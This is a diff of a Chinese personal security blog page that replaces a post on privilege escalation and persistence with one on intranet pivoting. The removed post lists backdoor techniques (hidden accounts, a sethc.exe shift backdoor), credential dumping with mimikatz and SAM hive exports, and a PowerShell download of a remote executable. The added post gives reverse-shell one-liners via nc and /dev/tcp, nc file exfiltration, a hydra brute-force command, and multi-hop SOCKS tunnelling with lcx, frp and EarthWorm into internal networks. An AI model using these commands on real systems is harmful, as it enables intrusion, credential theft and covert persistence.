@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        提权｜undefined
+        内网穿透工具｜undefined
         
     </title>
 
-    <link rel="canonical" href="https://pengpengp.github.io/2019/03/03/提权/">
+    <link rel="canonical" href="https://pengpengp.github.io/2019/03/10/内网穿透工具/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -136,17 +136,17 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>提权</h1>
+                    <h1>内网穿透工具</h1>
                     
                     <span class="meta">
                          作者 pengpengp
                         <span>
-                          日期 2019-03-03
+                          日期 2019-03-10
                          </span>
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#内网/提权" title="内网/提权">内网/提权</a>
+                        <a class="tag" href="/tags/#内网转发" title="内网转发">内网转发</a>
                         
                     </div>
                 </div>
@@ -155,7 +155,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            提权
+            内网穿透工具
         </span>
     </div>
 </header>
@@ -166,109 +166,93 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <hr>
-<hr>
-<h1 id="0x00本地服务提权"><a href="#0x00本地服务提权" class="headerlink" title="0x00本地服务提权"></a>0x00本地服务提权</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>1.从外部攻击服务器</p>
+                <h2 id="内网转发的三种：反弹shell、反弹端口、反弹代理"><a href="#内网转发的三种：反弹shell、反弹端口、反弹代理" class="headerlink" title="内网转发的三种：反弹shell、反弹端口、反弹代理"></a>内网转发的三种：反弹shell、反弹端口、反弹代理</h2><p>虚拟终端和bash -i的区别：</p>
+<pre><code>bash -i是交互式的shell，很多程序都要求用交互式shell
+</code></pre><h1 id="一。反弹shell"><a href="#一。反弹shell" class="headerlink" title="一。反弹shell"></a>一。反弹shell</h1><blockquote>
+<p>nc的使用：</p>
+</blockquote>
+<p>有两种方式：</p>
+<p>1.被动连接(让被攻击者反弹到监听)<br>    powershell中反弹命令：<br>    <code>nc ip port -e cmd.exe</code><br>    <code>nc ip port -e /bin/bash</code><br>    <code>bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</code></p>
+<p><code>监听nc -lnvp port</code></p>
+<p>2.主动连接(主动连接被攻击者)<br>    特点：攻击者不需要公网ip，但是被攻击的服务器必须在公网上<br>    被攻击：<br>    <code>nc -lnvp port -e cmd</code><br>    <code>nc -lnvp port -e /bin/bash</code><br>    攻击：<br>    <code>nc ip port</code></p>
+<p>还有其他反弹的方式：如perl、php、python语言反弹<br><a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
+<h1 id="二。反弹端口"><a href="#二。反弹端口" class="headerlink" title="二。反弹端口"></a>二。反弹端口</h1><p>流程：A出-&gt;B入-&gt;B出-&gt;C入（A为攻击者、B为getshell机器、C为内网被攻击者）    </p>
+<p>工具：lcx(windows)、frp</p>
+<blockquote>
+<p>lcx工具的使用：</p>
+</blockquote>
+<pre><code>步骤一：外网服务器开启监听
+lcx -listen 4444 12345
+步骤二：将被控主机端口转发到外网服务器
+lcx.exe –slave 公网 IP + 端口 被控服务器IP + 端口
+lcx -slave 1.1.1.1 4444 127.0.0.1 80
+步骤三：在外网服务器连接本地12345端口
+然后mstsc 127.0.0.1:12345
+</code></pre><blockquote>
+<p>用nc进行文件传输:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A:`tar cfz - 文件名 | nc 10.0.1.162 9995`</span><br><span class="line">B:`nc -l 21000 | tar zxvf -`</span><br><span class="line"></span><br><span class="line">nc的使用:https://www.cnblogs.com/nmap/p/6148306.html</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>frp的使用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr=0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">auto_token=12345678（密码可以自己修改）</span><br><span class="line"></span><br><span class="line">dashboard_port = 7500（网页登录端口）</span><br><span class="line">dashboard_user = admin（网页登录账户）</span><br><span class="line">dashboard_pwd = admin（网页登录密码）</span><br><span class="line">https://www.atsurak.com/frp-windows-rdp/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>常见要扫描的端口：</p>
+</blockquote>
 <ul>
-<li><p>ms17-010</p>
+<li><p>22端口—爆破，无意义<br><code>hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</code></p>
 </li>
-<li><p>ms08-067</p>
+<li><p>80端口—http的注入</p>
 </li>
-<li><p>…</p>
+<li><p>1433端口—mssql数据库</p>
+</li>
+<li><p>6379端口—外联<br>redis -cli -h ip -p port<br>config get dir 查看之前的设置路径<br>config get dbfilename 查看之前的创建文件<br>keys *查看之前创建的键，”key” “ssh”<br>get ssh查看之前的键值</p>
+</li>
+<li><p>8000端口—网站</p>
+</li>
+<li><p>9000端口—nginx漏洞<br>***找未授权类可以利用的端口，才有意义</p>
 </li>
 </ul>
-<p>  2.从内部攻击服务器</p>
+<p>等等</p>
+<hr>
+<hr>
+<h1 id="三。反弹代理"><a href="#三。反弹代理" class="headerlink" title="三。反弹代理"></a>三。反弹代理</h1><blockquote>
+<p>ew工具的使用：</p>
+</blockquote>
 <ul>
-<li>上传提权脚本    x64.exe\pr.exe</li>
-<li>然后运行就可以了</li>
-</ul>
-<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>只能从内部攻击服务器</p>
-<ul>
-<li><p>获取内核版本，操作系统版本，</p>
-</li>
-<li><p>去找对应的exp</p>
-</li>
-<li><p>下载exp.c文件，进行编译运行</p>
-<hr>
-<hr>
-</li>
-</ul>
-<h1 id="0x01数据库提权"><a href="#0x01数据库提权" class="headerlink" title="0x01数据库提权"></a>0x01数据库提权</h1><h3 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h3><h3 id="mssql直接执行命令"><a href="#mssql直接执行命令" class="headerlink" title="mssql直接执行命令"></a>mssql直接执行命令</h3><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul>
-<li><p>windows：开机启动项、mof脚本、udf函数</p>
-</li>
-<li><p>linux：udf函数、计划任务、ssh公钥</p>
-</li>
-</ul>
-<hr>
-<hr>
-<h1 id="0x02第三方软件提权："><a href="#0x02第三方软件提权：" class="headerlink" title="0x02第三方软件提权："></a>0x02第三方软件提权：</h1><ul>
-<li>server-u</li>
-<li>远控软件</li>
-<li>。。。</li>
-</ul>
-<hr>
-<hr>
-<h1 id="0x03维持权限-留后门"><a href="#0x03维持权限-留后门" class="headerlink" title="0x03维持权限(留后门)"></a>0x03维持权限(留后门)</h1><h2 id="一。windows留后门"><a href="#一。windows留后门" class="headerlink" title="一。windows留后门"></a>一。windows留后门</h2><ul>
-<li><p>1.添加隐藏账户</p>
-<p>可以完全隐藏—&gt;改注册表—&gt;<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
-</li>
+<li>第1种方式.在中间人服务器使用<br><code>ew -s ssocksd -l 4444</code>—在服务器上监听一个端口，所有发送到这个端口的流量都将被此服务器转发，(类似shadowsocks)    </li>
 </ul>
 <ul>
-<li><p>2.启用来宾账户并添加为管理员</p>
-<p><code>注：从windows2008开始有来宾账户</code></p>
-</li>
+<li>第2种方式.在攻击者和被攻击者服务器使用<pre><code>攻击者：ew -s rcsocks -l 1080 -e 6666
+被攻击方：ew -s rssocks -d 192.168.11.123 -e 6666
+</code></pre></li>
 </ul>
-<ul>
-<li><p>3.shift后门 —用<code>c:\windows\cmd.exe</code>替换：<code>c:\windows\system32\sethc.exe</code><br> 然后在登录界面就可以用粘滞键启动cmd了</p>
-</li>
-<li><p>4.启动项、计划任务(不推荐)</p>
-</li>
-<li><p>5.DLL劫持</p>
-</li>
-<li><p>6.powershell后门</p>
-</li>
-<li><p>7.远控软件</p>
-</li>
-<li><p>8.获取现有账号的密码(推荐)</p>
-</li>
-</ul>
-<p>windows获取管理员密码：</p>
-<pre><code>获取密码： 
-wce.exe
-QuarksPwDump.exe
-Pwdump7.exe
-    x64.exe &quot;Pwdump7.exe&quot;
-    获取到hash值去somd5破解(或者彩虹表)
-gethash.exe
-mimikatz
-cain:登陆目标机器导出注册表成文件，然后用cain加载获取hash
-    reg save hklm\sam C:\hash\sam.hive
-    reg save hklm\system C:\hash\system.hive
-    reg save hklm\security C:\hash\security.hive
-    优点：免杀
-powershell脚本获取密码：
-    $client = new-object System.Net.WebClient;
-    $client.DownloadFile(&apos;http://*.*.*.*/a.exe&apos;,&apos;D:\GetPassword.exe&apos;);
-</code></pre><p>注：关闭windows系统保护的方法</p>
-<p><code>takeown /f c:\windows\system32\*.*   /a /r /d y</code><br>    <code>cacls  c:\windows\system32\*.*  /T /E /G administrators:F</code></p>
-<h2 id="二。linux留后门-获取root密码："><a href="#二。linux留后门-获取root密码：" class="headerlink" title="二。linux留后门+获取root密码："></a>二。linux留后门+获取root密码：</h2><pre><code>获取密码：读/etc/shadow文件破解
-加ssh公钥
-加用户
-计划任务
-参考脏牛(修改passwd文件添加&quot;user:password:0:0&quot;)
-</code></pre>
+<p>多层内网穿透：</p>
+<p>假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</p>
+<p>1.先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上</p>
+<p><code>./ew_for_Win.exe -s rcsocks -l 1080 -e 1235</code></p>
+<p>2.在内网入口上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定</p>
+<p><code>ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456</code></p>
+<p>3.在内网二层数据库服务器上执行,将来自外部的1236端口和本地的3456端口进行绑定<br><code>./ew_for_Win.exe -s lcx_listen -l 3456 -e 1236</code></p>
+<p>4.在最里层的linux上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功<br><code>./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236</code></p>
+<p>5.最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据    </p>
+<blockquote>
+<p>对应的代理工具使用：</p>
+</blockquote>
+<p>1.proxifier</p>
+<p>2.SocksCap64    </p>
+<p>3.proxyChains工具</p>
+<p>​    用代理时nmap -sT -Pn ip才能扫描到<br>​        linux设置全局：</p>
+<p>​    <code>alias proxy=&#39;export all_proxy=socks5://127.0.0.1:1086&#39;</code><br>​        <code>alias unproxy=&#39;unset all_proxy&#39;</code><br>​                    </p>
+
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2019/03/10/内网穿透工具/" data-toggle="tooltip" data-placement="top" title="内网穿透工具">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2019/03/03/grep-find-awk-sed指令基础/" data-toggle="tooltip" data-placement="top" title="grep.find.awk.sed指令基础">Next Post &rarr;</a>
+                        <a href="/2019/03/03/提权/" data-toggle="tooltip" data-placement="top" title="提权">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -287,8 +271,8 @@ powershell脚本获取密码：
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00本地服务提权"><span class="toc-text">0x00本地服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01数据库提权"><span class="toc-text">0x01数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis未授权"><span class="toc-text">redis未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql直接执行命令"><span class="toc-text">mssql直接执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02第三方软件提权："><span class="toc-text">0x02第三方软件提权：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03维持权限-留后门"><span class="toc-text">0x03维持权限(留后门)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一。windows留后门"><span class="toc-text">一。windows留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二。linux留后门-获取root密码："><span class="toc-text">二。linux留后门+获取root密码：</span></a></li></ol></li>
-                </div>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网转发的三种：反弹shell、反弹端口、反弹代理"><span class="toc-text">内网转发的三种：反弹shell、反弹端口、反弹代理</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一。反弹shell"><span class="toc-text">一。反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二。反弹端口"><span class="toc-text">二。反弹端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三。反弹代理"><span class="toc-text">三。反弹代理</span></a>
+                </li></div>
             </div>
         </div>
 
